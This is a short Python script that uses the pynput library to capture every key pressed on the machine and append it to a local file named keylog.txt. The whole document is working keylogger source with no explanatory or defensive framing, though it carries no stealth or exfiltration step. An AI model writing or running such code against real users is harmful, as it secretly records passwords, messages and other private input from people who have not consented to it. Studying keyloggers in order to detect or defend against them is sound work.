#!/usr/bin/python3

from pynput import keyboard

log_file = "keylog.txt"

def keystrokes(skey):
    with open(log_file, "a") as file:
        try:
            file.write(f"{skey.char}")
        except:
            file.write(f" {skey} ")
            
with keyboard.Listener(on_press=keystrokes) as listener:
    listener.join()


